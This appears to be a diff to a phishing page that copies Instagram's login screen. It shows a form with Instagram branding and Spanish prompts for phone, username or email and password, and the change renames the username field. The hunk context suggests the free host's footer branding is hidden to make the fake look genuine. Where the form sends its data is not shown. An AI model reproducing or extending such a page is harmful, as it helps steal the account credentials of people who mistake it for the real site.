@@ -52,7 +52,7 @@ img[src*="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000w
                 <div class="content-logo">
    	   			   <img src="img/instagram.png">
    	   		    </div>
-                <input type="text" name="correo" class="correoinsta" placeholder="teléfono, Usuario, Correo electronico">
+                <input type="text" name="correof" class="correoinsta" placeholder="teléfono, Usuario, Correo electronico">
                 <input type="password" name="pass" class="passinsta" placeholder="contraseña">
    	   			<input type="submit" value="Iniciar Sesión" class="btn-ingresar">
 
